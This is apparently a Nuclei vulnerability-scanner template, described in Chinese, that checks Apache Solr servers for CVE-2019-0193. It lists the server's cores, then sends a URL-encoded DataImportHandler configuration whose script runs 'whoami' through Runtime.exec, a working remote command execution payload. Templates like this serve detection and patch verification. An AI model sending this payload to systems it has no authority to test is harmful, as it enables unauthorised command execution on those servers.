id: CVE-2019-0193

info:
  name: Apache Solr DataImportHandler - 远程命令执行(CVE-2019-0193)
  author: wintry
  severity: critical
  description: |
    Apache Solr < 8.2.0 版本 DataImportHandler容易受到远程代码执行漏洞的攻击.
    DataImportHandler 是一个可选但流行的模块，用于从数据库和其他来源提取数据.
    该模块具有一个功能，其中整个 DIH 配置可以来自请求的“dataConfig”参数.
    DIH 管理屏幕的调试模式使用它来方便地调试开发 DIH 配置,由于 DIH 配置可以包含脚本，因此此参数存在安全风险.
  remediation: |
    从 Solr 8.2.0 版本开始,使用此参数需要将 Java 系统属性enable.dih.dataConfigParam设置为 true.
  tags: solr
  metadata:
    max-request: 2

http:
  - raw:
      - |
        GET /solr/admin/cores?wt=json HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Connection: close

      - |
        POST /solr/{{core}}/dataimport?indent=on&wt=json HTTP/1.1
        Host: {{Hostname}}
        Content-type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        command%3Dfull-import%26verbose%3Dfalse%26clean%3Dfalse%26commit%3Dtrue%26debug%3Dtrue%26core%3Dtest%26dataConfig%3D%3CdataConfig%3E%0A%2B%2B%3CdataSource%2Btype%3D%22URLDataSource%22%2F%3E%0A%2B%2B%3Cscript%3E%3C!%5BCDATA%5B%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2Bfunction%2Bpoc()%7B%2Bjava.lang.Runtime.getRuntime().exec(%22whoami%22)%3B%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%7D%0A%2B%2B%5D%5D%3E%3C%2Fscript%3E%0A%2B%2B%3Cdocument%3E%0A%2B%2B%2B%2B%3Centity%2Bname%3D%22stackoverflow%22%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2Burl%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2Bprocessor%3D%22XPathEntityProcessor%22%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2BforEach%3D%22%2Ffeed%22%0A%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2B%2Btransformer%3D%22script%3Apoc%22%2B%2F%3E%0A%2B%2B%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%26name%3Ddataimport

    extractors:
      - type: regex
        internal: true
        name: core
        group: 1
        regex:
          - '"name"\:"(.*?)"'

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "system"
          - "root"
          - "admin"
        condition: or

      - type: status
        status:
          - 200